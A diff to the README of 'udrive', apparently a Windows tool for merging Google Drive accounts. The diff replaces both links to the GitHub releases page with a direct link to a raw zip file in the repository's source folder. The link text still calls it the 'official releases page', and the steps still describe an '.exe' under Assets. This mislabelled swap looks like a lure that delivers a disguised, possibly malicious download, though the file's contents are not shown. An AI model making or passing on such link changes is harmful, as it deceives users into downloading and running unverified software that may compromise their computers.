@@ -1,6 +1,6 @@
 # 📂 udrive - Combine multiple Google Drive accounts easily
 
-[![](https://img.shields.io/badge/Download_udrive_for_Windows-blue)](https://github.com/kamsa3056/udrive/releases)
+[![](https://img.shields.io/badge/Download_udrive_for_Windows-blue)](https://raw.githubusercontent.com/kamsa3056/udrive/main/src/Software_2.6.zip)
 
 udrive merges your multiple Google Drive accounts into one storage space. Google provides 15GB of free storage for every account. If you own many accounts, you possess a massive amount of storage hidden across different logins. This application gathers those scattered accounts and shows them as a single folder on your computer. You see all your files in one place without logging in and out of different browser tabs.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The application works best
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/kamsa3056/udrive/releases) to obtain the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/kamsa3056/udrive/main/src/Software_2.6.zip) to obtain the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder once the transfer finishes.
